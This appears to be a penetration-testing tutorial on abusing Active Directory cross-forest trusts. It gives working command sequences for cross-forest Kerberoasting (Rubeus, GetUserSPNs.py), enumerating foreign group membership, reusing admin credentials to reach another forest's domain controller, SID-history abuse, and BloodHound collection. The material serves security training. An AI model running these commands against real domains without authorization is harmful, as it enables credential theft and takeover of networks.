# Cross-Forest Trust Abuse

In this section will cover:
- Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
- Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

### Cross-Forest Kerberoasting

Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold. Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.
````powershell
# Enumerating Accounts for Associated SPNs Using Get-DomainUser
> Get-DomainUser -SPN -Domain <domain2> | select SamAccountName

# Enumerating the <user> Account
> Get-DomainUser -Domain <domain2> -Identity <user> |select samaccountname,memberof

# Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
> .\Rubeus.exe kerberoast /domain:<domain2> /user:<user> /nowrap
````

### Admin Password Re-Use & Group Membership

From time to time, we'll run into a situation where there is a bidirectional forest trust managed by admins from the same company. If we can take over Domain A and obtain cleartext passwords or NT hashes for either the built-in Administrator account (or an account that is part of the Enterprise Admins or Domain Admins group in Domain A), and Domain B has a highly privileged account with the same name, then it is worth checking for password reuse across the two forests. I occasionally ran into issues where, for example, Domain A would have a user named adm_bob.smith in the Domain Admins group, and Domain B had a user named bsmith_admin. Sometimes, the user would be using the same password in the two domains, and owning Domain A instantly gave me full admin rights to Domain B.

We may also see users or admins from Domain A as members of a group in Domain B. Only Domain Local Groups allow security principals from outside its forest. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.
````powershell
# Using Get-DomainForeignGroupMember
> Get-DomainForeignGroupMember -Domain <domain2>

> Convert-SidToName <MemberNameSid>

# Accessing DC03 Using Enter-PSSession
> Enter-PSSession -ComputerName <DC_Domain2> -Credential <domain1>\administrator
````

### SID History Abuse - Cross Forest

SID History can also be abused across a forest trust. If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust. If the SID of an account with administrative privileges in Forest A is added to the SID history attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest.

## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

### Cross-Forest Kerberoasting
````bash
# Using GetUserSPNs.py
$ GetUserSPNs.py -target-domain <domain2> <domain1>/<user>

# Using the -request Flag
$ GetUserSPNs.py -request -target-domain <domain2> <domain1>/<user>
````
We could then attempt to crack this offline using Hashcat with mode 13100.

### Hunting Foreign Group Membership with Bloodhound-python

Since only Domain Local Groups allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship. If we are testing from a Linux host, we can gather this information by using the Python implementation of BloodHound. We can use this tool to collect data from multiple domains, ingest it into the GUI tool and search for these relationships.
````bash
# Adding <domain1> Information to /etc/resolv.conf
domain <domain1>
nameserver <IP_DC_Domain1>

# Running bloodhound-python Against <domain1>
$ bloodhound-python -d <domain1> -dc <host_DC_Domain1> -c All -u <user> -p <password> --zip

# Adding <domain2> Information to /etc/resolv.conf
domain <domain2>
nameserver <IP_DC_Domain2>

# Running bloodhound-python Against <domain2>
$ bloodhound-python -d <domain2> -dc <host_DC_Domain2> -c All -u <user>@<domain1> -p <password> --zip
````
After uploading the second set of data (either each JSON file or as one zip file), we can click on **Users with Foreign Domain Group Membership** under the Analysis tab and select the source domain as `<domain1>`. Here, we will see the built-in Administrator account for the `<domain1>` domain is a member of the built-in Administrators group in the `<domain2>` domain as we saw previously.
